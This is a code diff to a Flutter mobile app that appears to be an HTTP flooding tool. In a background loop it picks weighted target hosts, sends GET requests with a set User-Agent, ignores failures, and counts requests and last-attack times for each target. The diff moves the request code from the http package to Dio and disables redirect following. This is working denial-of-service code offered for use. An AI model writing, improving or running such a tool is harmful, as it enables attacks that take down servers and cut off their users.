@@ -12,6 +12,7 @@ import 'package:flutter_background/flutter_background.dart';
 import 'package:flutter/widgets.dart';
 import 'package:sentry_flutter/sentry_flutter.dart';
 import 'package:sentry/sentry.dart';
+import 'package:dio/dio.dart';
 
 const textColor = Color(0xFFEAEAEA);
 const grayColor = Color(0xFFC6C6C6);
@@ -184,9 +185,10 @@ class _MyHomePageState extends State<MyHomePage> {
         await FlutterBackground.initialize(androidConfig: androidConfig);
 
     bool successSecond = true;
-  
+
     if (!successFirst) {
-      successSecond = await FlutterBackground.initialize(androidConfig: androidConfig);
+      successSecond =
+          await FlutterBackground.initialize(androidConfig: androidConfig);
     }
 
     if (successSecond) {
@@ -260,12 +262,16 @@ class _MyHomePageState extends State<MyHomePage> {
     try {
       final pointAttack = randomChoice(_tasks, _weight);
       var proto = pointAttack.proto != '' ? pointAttack.proto : 'http';
-      Uri endpoint = Uri.parse("${proto}://${pointAttack.host}");
 
-      http
-          .get(endpoint, headers: {"User-Agent": _userAgent})
-          .timeout(const Duration(seconds: 3))
-          .catchError((e) {});
+      final endpoint = "${proto}://${pointAttack.host}";
+      try {
+        await Dio().get(endpoint,
+            options: Options(
+              followRedirects: false,
+              headers: {"User-Agent": _userAgent},
+              receiveTimeout: 3000,
+            ));
+      } catch (e) {}
       _totalRequests += 1;
       logs[pointAttack.sId]["count"] += 1;
       logs[pointAttack.sId]["lastAttack"] = DateTime.now();
